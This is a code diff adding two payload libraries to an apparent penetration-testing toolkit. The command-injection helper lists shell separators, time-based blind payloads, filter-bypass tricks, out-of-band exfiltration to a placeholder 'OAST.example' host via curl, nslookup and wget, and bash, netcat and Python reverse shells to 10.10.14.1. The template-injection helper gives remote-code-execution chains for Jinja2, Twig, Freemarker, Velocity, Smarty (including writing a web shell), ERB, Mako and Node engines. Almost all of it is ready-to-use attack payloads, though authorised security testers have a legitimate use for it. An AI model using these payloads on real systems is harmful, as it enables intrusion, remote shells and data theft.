@@ -916,3 +916,165 @@ TOOLS['revshell'] = {
   }
 };
 
+// ===== COMMAND INJECTION PAYLOAD LIBRARY =====
+TOOLS['cmdi-payloads'] = {
+  title: 'Command Injection Helper',
+  desc: 'OS command injection payloads: separators, blind/time-based, OOB, and filter/WAF bypasses.',
+  render() {
+    const sections = [
+      { name: 'Separators & Chaining', note: 'Inject after a parameter that reaches a shell', items: [
+        { p: '; id', d: 'Semicolon (Unix) - run a second command' },
+        { p: '| id', d: 'Pipe - feed into a new command' },
+        { p: '|| id', d: 'Run only if the first command fails' },
+        { p: '& id', d: 'Background / chain (Unix & Windows)' },
+        { p: '&& id', d: 'Run only if the first command succeeds' },
+        { p: '`id`', d: 'Backtick command substitution' },
+        { p: '$(id)', d: 'Modern command substitution' },
+        { p: '%0a id', d: 'URL-encoded newline injects a new line' },
+        { p: '%0aid', d: 'Newline, no space' },
+        { p: '{cat,/etc/passwd}', d: 'Brace expansion (no spaces needed)' },
+        { p: 'a) ; id ; (', d: 'Break out of a subshell / parentheses' },
+      ]},
+      { name: 'Confirm (Unix)', note: 'Low-noise commands to prove execution', items: [
+        { p: 'id', d: 'Current uid/gid (best single proof)' },
+        { p: 'whoami', d: 'Current user' },
+        { p: 'uname -a', d: 'Kernel / OS' },
+        { p: 'hostname', d: 'Host name' },
+        { p: 'cat /etc/passwd', d: 'User list' },
+        { p: 'echo CMDI$((7*7))', d: 'Math marker (CMDI49) - safe canary' },
+      ]},
+      { name: 'Confirm (Windows)', items: [
+        { p: 'whoami', d: 'Current user' },
+        { p: 'ver', d: 'Windows version' },
+        { p: 'systeminfo', d: 'Full host info' },
+        { p: 'ipconfig /all', d: 'Network config' },
+        { p: 'type C:\\Windows\\win.ini', d: 'Read a known file' },
+        { p: 'set', d: 'Environment variables' },
+      ]},
+      { name: 'Blind: Time-based', note: 'No output? Make it sleep and watch the response time', items: [
+        { p: '; sleep 5', d: 'Unix delay' },
+        { p: '$(sleep 5)', d: 'Delay via substitution' },
+        { p: '`sleep 5`', d: 'Delay via backticks' },
+        { p: '| ping -c 5 127.0.0.1', d: 'Delay via ping (Unix)' },
+        { p: '& ping -n 5 127.0.0.1', d: 'Delay via ping (Windows)' },
+        { p: '& timeout /t 5', d: 'Windows timeout' },
+        { p: '; ping -c 5 127.0.0.1 #', d: 'Comment out the rest of the line' },
+      ]},
+      { name: 'Blind: Out-of-Band (OAST)', note: 'True blind - exfil to a Collaborator/Interactsh host', items: [
+        { p: '; curl http://OAST.example/$(whoami)', d: 'HTTP callback with output' },
+        { p: '; nslookup `whoami`.OAST.example', d: 'DNS exfil (Unix)' },
+        { p: '& nslookup OAST.example', d: 'DNS callback (Windows)' },
+        { p: '& powershell -c "iwr http://OAST.example"', d: 'HTTP callback (Windows)' },
+        { p: '; wget --post-data "x=$(id|base64)" http://OAST.example', d: 'POST exfil, base64-encoded' },
+      ]},
+      { name: 'Filter / WAF Bypass', note: 'Defeat space/keyword filters', items: [
+        { p: 'cat${IFS}/etc/passwd', d: '${IFS} replaces spaces' },
+        { p: 'cat$IFS$9/etc/passwd', d: '$IFS$9 space trick' },
+        { p: '{cat,/etc/passwd}', d: 'Brace expansion (no space)' },
+        { p: 'c"a"t /etc/passwd', d: 'Quotes break keyword matching' },
+        { p: "c'a't /etc/passwd", d: 'Single quotes break keywords' },
+        { p: 'c\\at /etc/passwd', d: 'Backslash breaks keywords' },
+        { p: '/???/c?t /etc/passwd', d: 'Wildcards avoid literal binary names' },
+        { p: 'who$@ami', d: '$@ is empty - splits the word' },
+        { p: 'echo aWQ=|base64 -d|bash', d: 'Base64-encoded command (id)' },
+        { p: 'a;b$u{cat,/etc/passwd}', d: 'Mixed obfuscation' },
+      ]},
+      { name: 'Argument / Parameter Injection', note: 'When input becomes a flag, not a command', items: [
+        { p: '-oProxyCommand=id', d: 'ssh/scp ProxyCommand RCE' },
+        { p: '--use-askpass=/tmp/x', d: 'Abuse a tool that runs a helper' },
+        { p: '-o /var/www/html/sh.php', d: 'Write to an arbitrary path (curl -o)' },
+        { p: '@/etc/passwd', d: 'curl/ffmpeg file read via @file' },
+      ]},
+      { name: 'Reverse Shell Triggers', note: 'Full generators are in the Reverse Shell tool', items: [
+        { p: '; bash -i >& /dev/tcp/10.10.14.1/443 0>&1', d: 'Bash TCP reverse shell' },
+        { p: '; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 443 >/tmp/f', d: 'Netcat mkfifo reverse shell' },
+        { p: '; python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.1",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")\'', d: 'Python3 reverse shell' },
+      ]},
+    ];
+    const tips = [
+      { title: 'Always confirm', body: 'If you see no output, switch to a time-based payload (sleep 5) and watch the response time, or use an OOB/DNS callback for true blind injection.' },
+      { title: 'Math canary', body: 'echo $((7*7)) printing 49 proves a shell evaluated it, with far less noise than reading sensitive files.' },
+      { title: 'Spaces blocked?', body: 'Use ${IFS}, $IFS$9, brace expansion {cmd,arg}, or tabs instead of spaces.' },
+    ];
+    return renderPayloadLibrary('Command Injection Payloads', sections, tips);
+  },
+  init() { initPayloadLibrary(); }
+};
+
+// ===== SSTI (TEMPLATE INJECTION) PAYLOAD LIBRARY =====
+TOOLS['ssti-payloads'] = {
+  title: 'SSTI Helper',
+  desc: 'Server-Side Template Injection payloads and RCE chains for Jinja2, Twig, Freemarker, ERB and more.',
+  render() {
+    const sections = [
+      { name: 'Detection & Polyglots', note: 'Send these first to see which syntax evaluates', items: [
+        { p: '{{7*7}}', d: 'Jinja2 / Twig / Nunjucks → 49' },
+        { p: '${7*7}', d: 'Freemarker / Mako / JSP EL → 49' },
+        { p: '<%= 7*7 %>', d: 'ERB / EJS → 49' },
+        { p: '#{7*7}', d: 'Ruby / Pug / Thymeleaf → 49' },
+        { p: '*{7*7}', d: 'Thymeleaf / Spring EL → 49' },
+        { p: "{{7*'7'}}", d: 'Jinja2 → 7777777, Twig → 49 (tells them apart)' },
+        { p: '${{<%[%\'"}}%\\', d: 'Polyglot that errors across most engines' },
+        { p: '{{ . }}', d: 'Go templates - dumps the context' },
+      ]},
+      { name: 'Jinja2 / Flask (Python)', note: 'Most common; many gadgets reach os', items: [
+        { p: '{{config}}', d: 'Dump Flask config (often has SECRET_KEY)' },
+        { p: '{{config.items()}}', d: 'Config as key/value pairs' },
+        { p: '{{self.__init__.__globals__}}', d: 'Reach globals' },
+        { p: "{{cycler.__init__.__globals__.os.popen('id').read()}}", d: 'RCE via cycler (clean, modern)' },
+        { p: "{{lipsum.__globals__.os.popen('id').read()}}", d: 'RCE via lipsum' },
+        { p: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", d: 'RCE via request object' },
+        { p: "{{''.__class__.__mro__[1].__subclasses__()}}", d: 'List subclasses to find a gadget' },
+        { p: "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}", d: 'Arbitrary file read' },
+      ]},
+      { name: 'Twig (PHP)', items: [
+        { p: '{{7*7}}', d: 'Confirm (→ 49)' },
+        { p: '{{_self}}', d: 'Twig template object' },
+        { p: "{{['id']|filter('system')}}", d: 'RCE via filter (Twig 1.x)' },
+        { p: "{{['id']|map('system')|join}}", d: 'RCE via map' },
+        { p: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", d: 'RCE via undefined filter callback' },
+      ]},
+      { name: 'Freemarker (Java)', items: [
+        { p: '${7*7}', d: 'Confirm (→ 49)' },
+        { p: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', d: 'RCE via Execute' },
+        { p: '${"freemarker.template.utility.Execute"?new()("id")}', d: 'One-liner Execute' },
+        { p: '${product.getClass().getProtectionDomain()}', d: 'Reach the class loader' },
+      ]},
+      { name: 'Velocity (Java)', items: [
+        { p: '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($p=$rt.getRuntime().exec("id"))$p', d: 'RCE via Runtime' },
+        { p: '#set($e="exp")$e.getClass().forName("java.lang.System").getProperty("user.dir")', d: 'Read a system property' },
+      ]},
+      { name: 'Smarty (PHP)', items: [
+        { p: '{$smarty.version}', d: 'Confirm Smarty + version' },
+        { p: "{php}system('id');{/php}", d: 'RCE (Smarty < 3.1)' },
+        { p: "{system('id')}", d: 'RCE if PHP functions are allowed' },
+        { p: "{Smarty_Internal_Write_File::writeFile('x.php','<?php system($_GET[0]);',self::clearConfig())}", d: 'Write a web shell' },
+      ]},
+      { name: 'ERB / Ruby', items: [
+        { p: '<%= 7*7 %>', d: 'Confirm (→ 49)' },
+        { p: "<%= system('id') %>", d: 'RCE via system' },
+        { p: '<%= `id` %>', d: 'RCE via backticks' },
+        { p: "<%= IO.popen('id').read %>", d: 'RCE, captures output' },
+        { p: "<%= File.read('/etc/passwd') %>", d: 'File read' },
+      ]},
+      { name: 'Mako (Python)', items: [
+        { p: '${7*7}', d: 'Confirm (→ 49)' },
+        { p: "<%import os%>${os.popen('id').read()}", d: 'RCE via import' },
+        { p: "${self.module.cache.util.os.system('id')}", d: 'RCE via module chain' },
+      ]},
+      { name: 'Node (EJS / Pug / Nunjucks)', items: [
+        { p: "<%= global.process.mainModule.require('child_process').execSync('id') %>", d: 'EJS RCE' },
+        { p: "#{global.process.mainModule.require('child_process').execSync('id')}", d: 'Pug RCE' },
+        { p: '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}', d: 'Nunjucks RCE' },
+      ]},
+    ];
+    const tips = [
+      { title: 'Map before you fire', body: 'Use the detection payloads to identify the engine first - the wrong RCE gadget just errors and can lock you out of a parameter.' },
+      { title: '7*7 vs 7*\'7\'', body: 'A multiplied number (49) means code execution. {{7*\'7\'}} returning 7777777 points to Jinja2, while 49 points to Twig.' },
+      { title: 'Sandboxes', body: 'Many engines sandbox by default. Look for gadget chains (cycler, lipsum, request) that escape to os/Runtime.' },
+    ];
+    return renderPayloadLibrary('SSTI Payloads', sections, tips);
+  },
+  init() { initPayloadLibrary(); }
+};
+
